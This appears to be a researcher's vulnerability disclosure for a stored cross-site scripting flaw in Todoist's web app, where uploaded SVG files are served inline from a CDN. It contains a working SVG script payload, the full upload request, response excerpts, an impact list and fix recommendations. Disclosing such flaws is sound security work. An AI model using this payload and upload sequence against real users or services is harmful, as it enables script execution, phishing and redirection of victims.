# Todoist.v8896
Poc

Todoist Web – Stored XSS via SVG Upload (CDN Render)

Class: Stored XSS (unsafe SVG rendering)
Where: POST /api/v1/uploads → files.todoist.com → signed *.cloudfront.net
Tested: 2025-09 (webapp ~8895–8896)

Summary

Uploaded SVG files are returned with Content-Type: image/svg+xml and inline disposition from a signed CloudFront URL. No sanitization/CSP sandbox is applied, so embedded JS executes when a victim opens the attachment from a Todoist task/comment.

PoC payload

<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    alert(prompt("sender_sefa_basnak"));
  ]]></script>
  <rect width="10" height="10" fill="red"/>
</svg>

Request (snippet)

POST /api/v1/uploads HTTP/2
Host: app.todoist.com
Authorization: Bearer <REDACTED>
Content-Type: multipart/form-data; boundary=...

--BOUNDARY
Content-Disposition: form-data; name="file_name"

poc.svg
--BOUNDARY
Content-Disposition: form-data; name="file_type"

image/svg+xml
--BOUNDARY
Content-Disposition: form-data; name="file"; filename="poc.svg"
Content-Type: image/svg+xml

<svg>...</svg>
--BOUNDARY--

Response (truncated)

{
  "file_url": "https://files.todoist.com/.../by/<uid>/as/file.svg",
  "file_type": "image/svg+xml",
  "upload_state": "completed"
}

Following redirects yields a signed CloudFront URL that returns:

HTTP/2 200
content-type: image/svg+xml
content-disposition: inline; filename*=UTF-8''poc.svg

Opening this URL executes the script (prompt/alert visible).

Impact
	•	Arbitrary JS execution on CDN origin when users open the attachment.
	•	Instant phishing/redirect via location=....
	•	Possible reverse-tabnabbing if links are ever opened without rel="noopener".

Fix recommendations
	•	Serve SVGs as downloads: Content-Disposition: attachment.
	•	Apply strict per-file CSP: Content-Security-Policy: sandbox; default-src 'none'; img-src data:.
	•	Sanitize/strip <script>, event handlers, external refs—or rasterize SVG server-side.
	•	Enforce rel="noopener noreferrer" everywhere.

Credits

Discovered by Sefa Basnak (@sefabasnak)
